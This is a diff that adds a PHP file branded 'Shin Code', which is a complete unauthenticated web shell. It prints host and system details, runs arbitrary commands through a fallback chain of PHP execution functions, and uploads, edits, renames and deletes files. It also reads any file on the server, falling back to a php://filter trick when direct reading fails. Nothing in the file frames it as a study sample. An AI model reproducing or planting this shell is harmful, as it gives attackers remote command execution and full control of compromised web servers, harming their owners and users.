@@ -1,0 +1,446 @@
+<?php
+
+function createBreadcrumb($currentDir)
+{
+    $parts = explode(DIRECTORY_SEPARATOR, $currentDir);
+    $breadcrumb = array();
+    $path = '';
+
+    foreach ($parts as $part) {
+        if ($part === '') continue;
+        $path .= DIRECTORY_SEPARATOR . $part;
+        $breadcrumb[] = "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>";
+    }
+
+    return implode(DIRECTORY_SEPARATOR, $breadcrumb);
+}
+
+$directory = isset($_GET['dir']) ? $_GET['dir'] : ".";
+$directory = @realpath($directory);
+
+if (!$directory || !is_dir($directory)) {
+    die("Invalid directory.");
+}
+echo "<center><h1><strong>- Shin Code -</center></h1></strong>";
+echo "<h4>Hostname: " . @gethostname() . "</h4>";
+echo "<h4>System:" . @php_uname() . "</h4>";
+
+echo "<h3>Upload File</h3>";
+echo "<form method='post' enctype='multipart/form-data'>";
+echo "<input type='file' name='file' required>";
+echo "<input type='submit' name='upload' value='Upload'>";
+echo "</form>";
+
+echo "<h3>Execute Command</h3>";
+echo "<form method='post'>";
+echo "<input type='text' name='cmd' placeholder='Enter command' required>";
+echo "<input type='submit' name='execute' value='Execute'>";
+echo "</form>";
+
+echo "<h2>DIR~: " . createBreadcrumb($directory) . "</h2>";
+
+echo "<table width='800' cellpadding='5' cellspacing='1' border='1'>";
+echo "<tr><th>Type</th><th>Name</th><th>Permissions</th><th>Actions</th></tr>";
+
+if (isset($_POST['execute'])) {
+    $command = $_POST['cmd'];
+    if (!empty($command)) {
+        $result = '';
+        $status = null;
+        $currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+
+        if (!$currentDir || !is_dir($currentDir)) {
+            echo "<p>Invalid directory. Execution aborted.</p>";
+            return;
+        }
+
+        chdir($currentDir);
+
+        if (function_exists('system')) {
+            ob_start();
+            system($command . " 2>&1", $status); // Tangkap keluaran error
+            $result = ob_get_clean();
+        } elseif (function_exists('passthru')) {
+            ob_start();
+            passthru($command . " 2>&1", $status);
+            $result = ob_get_clean();
+        } elseif (function_exists('exec')) {
+            exec($command . " 2>&1", $output, $status);
+            $result = implode("\n", $output);
+        } elseif (function_exists('shell_exec')) {
+            $result = shell_exec($command . " 2>&1");
+        } elseif (function_exists('proc_open')) {
+            $handle = proc_open($command, [
+                1 => ['pipe', 'w'],
+                2 => ['pipe', 'w']
+            ], $pipes);
+            if (is_resource($handle)) {
+                $result = stream_get_contents($pipes[1]);
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                proc_close($handle);
+            }
+        } elseif (function_exists('popen')) {
+            $handle = popen($command, 'r');
+            if (is_resource($handle)) {
+                while (!feof($handle)) {
+                    $result .= fread($handle, 8192);
+                }
+                pclose($handle);
+            }
+        }
+
+        if (!empty($result)) {
+            echo "<h4>Command executed in directory: " . htmlspecialchars($currentDir) . "</h4>";
+            echo "<pre style='white-space: pre-wrap; background-color: #f2f2f2; font-family: monospace; overflow-y: auto; box-sizing: border-box; height: 200px; width: 100%; max-width: 800px; margin-top: 10px;'>$result</pre>";
+        } else {
+            echo "<p>Failed to execute command.</p>";
+        }
+    } else {
+        echo "<p>Command cannot be empty.</p>";
+    }
+}
+
+
+
+if (!empty($message)) {
+    echo "<p style='color: green; font-weight: bold;'>$message</p>";
+}
+
+if (isset($_POST['upload'])) {
+    if ($_FILES['file']['error'] === UPLOAD_ERR_NO_FILE) {
+        echo "No files selected.";
+    } else {
+        $targetFile = $directory . "/" . basename($_FILES['file']['name']);
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
+            echo "File uploaded successfully using move_uploaded_file.";
+        } else {
+            echo "Failed to upload file using move_uploaded_file. Attempting alternative methods...<br>";
+            if (copy($_FILES['file']['tmp_name'], $targetFile)) {
+                echo "File uploaded successfully using copy.";
+            } 
+            else if (rename($_FILES['file']['tmp_name'], $targetFile)) {
+                echo "File uploaded successfully using rename.";
+            } 
+            else {
+                $inputStream = fopen($_FILES['file']['tmp_name'], 'rb');
+                $outputStream = fopen($targetFile, 'wb');
+
+                if ($inputStream && $outputStream) {
+                    while (!feof($inputStream)) {
+                        fwrite($outputStream, fread($inputStream, 8192));
+                    }
+                    fclose($inputStream);
+                    fclose($outputStream);
+                    if (file_exists($targetFile)) {
+                        echo "File uploaded successfully using stream operations.";
+                    } else {
+                        echo "Failed to upload file using stream operations.";
+                    }
+                } else {
+                    echo "Failed to open file streams.";
+                }
+            }
+        }
+    }
+}
+
+
+if (isset($_POST['edit'])) {
+    $fileToEdit = $directory . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
+    if (is_file($fileToEdit)) {
+        if (file_put_contents($fileToEdit, $_POST['file_content']) !== false) {
+            echo "File successfully edited using file_put_contents.";
+        } else {
+            echo "Failed to save file changes using file_put_contents. Attempting alternative methods...<br>";
+
+            $fileHandle = @fopen($fileToEdit, 'w');
+            if ($fileHandle) {
+                if (fwrite($fileHandle, $_POST['file_content']) !== false) {
+                    echo "File successfully edited using fwrite.";
+                } else {
+                    echo "Failed to save file changes using fwrite.";
+                }
+                fclose($fileHandle);
+            } else {
+                $tempFile = tempnam(sys_get_temp_dir(), 'edit_');
+                if ($tempFile) {
+                    if (file_put_contents($tempFile, $_POST['file_content']) !== false) {
+                        if (rename($tempFile, $fileToEdit)) {
+                            echo "File successfully edited using temporary file and rename.";
+                        } else {
+                            echo "Failed to rename the temporary file to the target file.";
+                        }
+                    } else {
+                        echo "Failed to write to temporary file.";
+                    }
+                    if (file_exists($tempFile)) {
+                        unlink($tempFile);
+                    }
+                } else {
+                    echo "Failed to create a temporary file.";
+                }
+            }
+            $inputStream = fopen('php://memory', 'w+');
+            if ($inputStream) {
+                fwrite($inputStream, $_POST['file_content']);
+                rewind($inputStream);
+
+                $outputStream = @fopen($fileToEdit, 'w');
+                if ($outputStream) {
+                    while (!feof($inputStream)) {
+                        if (fwrite($outputStream, fread($inputStream, 8192)) === false) {
+                            echo "Failed to save file changes using stream operations.";
+                            break;
+                        }
+                    }
+                    fclose($outputStream);
+                    echo "File successfully edited using stream operations.";
+                } else {
+                    echo "Failed to open the target file for writing.";
+                }
+                fclose($inputStream);
+            } else {
+                echo "Failed to create in-memory stream.";
+            }
+        }
+    } else {
+        echo "File not found.";
+    }
+}
+
+
+if (isset($_POST['rename'])) {
+    $oldName = $directory . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
+    $newName = $directory . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
+    if (rename($oldName, $newName)) {
+        echo "Name changed successfully.";
+    } else {
+        echo "Failed to rename.";
+    }
+}
+
+
+if (isset($_GET['action']) && isset($_GET['target'])) {
+    $action = $_GET['action'];
+    $target = $directory . DIRECTORY_SEPARATOR . basename($_GET['target']);
+
+    if ($action === 'delete') {
+        if (is_file($target)) {
+            if (unlink($target)) {
+                echo "File '" . htmlspecialchars($_GET['target']) . "' successfully deleted.";
+            } else {
+                echo "Failed to delete file '" . htmlspecialchars($_GET['target']) . "'.";
+            }
+        } elseif (is_dir($target)) {
+            if (rmdir($target)) {
+                echo "Folder '" . htmlspecialchars($_GET['target']) . "' successfully deleted.";
+            } else {
+                echo "Failed to delete folder '" . htmlspecialchars($_GET['target']) . "'.";
+            }
+        } else {
+            echo "Invalid target for deletion.";
+        }
+    } elseif ($action === 'edit') {
+        if (is_file($target)) {
+            $content = "File tidak dapat dibaca atau tidak ditemukan.";
+            if (is_readable($target)) {
+                $content = @file_get_contents($target);
+                if ($content === false) {
+                    $handle = @fopen($target, "r");
+                    if ($handle) {
+                        $content = '';
+                        while (!feof($handle)) {
+                            $content .= fread($handle, 8192);
+                        }
+                        fclose($handle);
+                    } else {
+                        $lines = @file($target, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+                        if ($lines !== false) {
+                            $content = implode("\n", $lines);
+                        } else {
+                            $content = "Gagal membaca file dengan semua metode.";
+                        }
+                    }
+                }
+                
+                $content = htmlspecialchars($content);
+            }
+            echo "<h3>Edit File: " . htmlspecialchars($_GET['target']) . "</h3>";
+            echo "<form method='post'>";
+            echo "<textarea name='file_content' rows='10' cols='50' style='width: 83%; height: 30%; box-sizing: border-box;'>$content</textarea><br>";            
+            echo "<input type='hidden' name='file_name' value='" . htmlspecialchars($_GET['target']) . "'>";
+            echo "<input type='submit' name='edit' value='Save'>";
+            echo "</form>";
+            echo "</pre>";
+        } else {
+            echo "File not found.";
+        }
+    } elseif ($action === 'rename') {
+        echo "<h3>Rename: " . htmlspecialchars($_GET['target']) . "</h3>";
+        echo "<form method='post'>";
+        echo "<input type='text' name='new_name' value='" . htmlspecialchars($_GET['target']) . "'>";
+        echo "<input type='hidden' name='old_name' value='" . htmlspecialchars($_GET['target']) . "'>";
+        echo "<input type='submit' name='rename' value='Rename'>";
+        echo "</form>";
+    }
+}
+
+
+$folders = array();
+$files = array();
+
+if ($dh = @opendir($directory)) {
+    while (($file = readdir($dh)) !== false) {
+        if ($file == "." || $file == "..") continue;
+        $path = $directory . DIRECTORY_SEPARATOR . $file;
+        if (is_dir($path)) {
+            $folders[] = $file;
+        } else {
+            $files[] = $file;
+        }
+    }
+    closedir($dh);
+} else {
+    echo "<tr><td colspan='4'>No items found.</td></tr>";
+}
+
+function getPermissions($path) {
+    $perms = fileperms($path);
+
+    if (($perms & 0xC000) == 0xC000) {
+        $info = 's'; // Socket
+    } elseif (($perms & 0xA000) == 0xA000) {
+        $info = 'l'; // Symbolic Link
+    } elseif (($perms & 0x8000) == 0x8000) {
+        $info = '-'; // Regular
+    } elseif (($perms & 0x6000) == 0x6000) {
+        $info = 'b'; // Block special
+    } elseif (($perms & 0x4000) == 0x4000) {
+        $info = 'd'; // Directory
+    } elseif (($perms & 0x2000) == 0x2000) {
+        $info = 'c'; // Character special
+    } elseif (($perms & 0x1000) == 0x1000) {
+        $info = 'p'; // FIFO pipe
+    } else {
+        $info = 'u'; // Unknown
+    }
+
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
+}
+
+if (isset($_GET['readfile'])) {
+    $fileToRead = $_GET['readfile'];
+    if (is_readable($fileToRead)) {
+        echo "<h3>Reading File: " . htmlspecialchars(basename($fileToRead)) . "</h3>";
+
+        $content = @file_get_contents($fileToRead);
+        
+        if ($content === false) {
+            $fileHandle = @fopen($fileToRead, 'r');
+            if ($fileHandle) {
+                $content = fread($fileHandle, filesize($fileToRead));
+                fclose($fileHandle);
+            } else {
+                $content = false;
+            }
+        }
+        
+        if ($content === false) {
+            $lines = @file($fileToRead);
+            if ($lines !== false) {
+                $content = implode("\n", $lines);
+            }
+        }
+
+        if ($content === false) {
+            $fileHandle = @fopen($fileToRead, 'r');
+            if ($fileHandle) {
+                $content = @stream_get_contents($fileHandle);
+                fclose($fileHandle);
+            }
+        }
+        
+        if ($content === false) {
+            $fileHandle = @fopen($fileToRead, 'r');
+            if ($fileHandle) {
+                $content = '';
+                while (($line = fgets($fileHandle)) !== false) {
+                    $content .= $line;
+                }
+                fclose($fileHandle);
+            }
+        }
+
+        if ($content === false) {
+            $content = @file_get_contents("php://filter/read=string.rot13/resource=" . $fileToRead);
+        }
+
+        if ($content !== false) {
+            echo "<pre style='white-space: pre-wrap; background-color: #f2f2f2; font-family: monospace; overflow-y: auto; box-sizing: border-box; height: 200px; width: 100%; max-width: 800px; margin-top: 10px;'>";
+            echo htmlspecialchars($content);
+            echo "</pre>";
+        } else {
+            echo "<p>Unable to read file. It may not be readable or it doesn't exist.</p>";
+        }
+    } else {
+        echo "<p>Unable to read file. It may not be readable or it doesn't exist.</p>";
+    }
+}
+
+
+foreach ($folders as $folder) {
+    $path = $directory . "/" . $folder;
+    $color = is_writable($path) ? "green" : "red";
+    $permissions = getPermissions($path);
+    echo "<tr><td>[DIR]</td><td><a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($folder) . "</a></td><td style='color: $color;'>$permissions</td><td>";
+    echo "<form method='get' style='display:inline;'>";
+    echo "<input type='hidden' name='dir' value='" . htmlspecialchars($directory) . "'>";
+    echo "<input type='hidden' name='target' value='" . htmlspecialchars($folder) . "'>";
+    echo "<select name='action'>";
+    echo "<option value=''>Select</option>";
+    echo "<option value='delete'>Delete</option>";
+    echo "</select>";
+    echo "<button type='submit'>go</button>";
+    echo "</form>";
+    echo "</td></tr>";
+}
+
+foreach ($files as $file) {
+    $path = $directory . "/" . $file;
+    $color = is_writable($path) ? "green" : "red";
+    $permissions = getPermissions($path);
+    echo "<tr><td>[FILE]</td><td><a href='?dir=" . urlencode($directory) . "&readfile=" . urlencode($directory . DIRECTORY_SEPARATOR . $file) . "'>" . htmlspecialchars($file) . "</a></td><td style='color: $color;'>$permissions</td><td>";
+    echo "<form method='get' style='display:inline;'>";
+    echo "<input type='hidden' name='dir' value='" . htmlspecialchars($directory) . "'>";
+    echo "<input type='hidden' name='target' value='" . htmlspecialchars($file) . "'>";
+    echo "<select name='action'>";
+    echo "<option value=''>Select</option>";
+    echo "<option value='edit'>Edit</option>";
+    echo "<option value='rename'>Rename</option>";
+    echo "<option value='delete'>Delete</option>";
+    echo "</select>";
+    echo "<button type='submit'>Go</button>";
+    echo "</form>";
+    echo "</td></tr>";
+}
+
+echo "</table>";
+
+echo "<br><b>Powered By <strong>Shin Code</b></strong>";
+?>
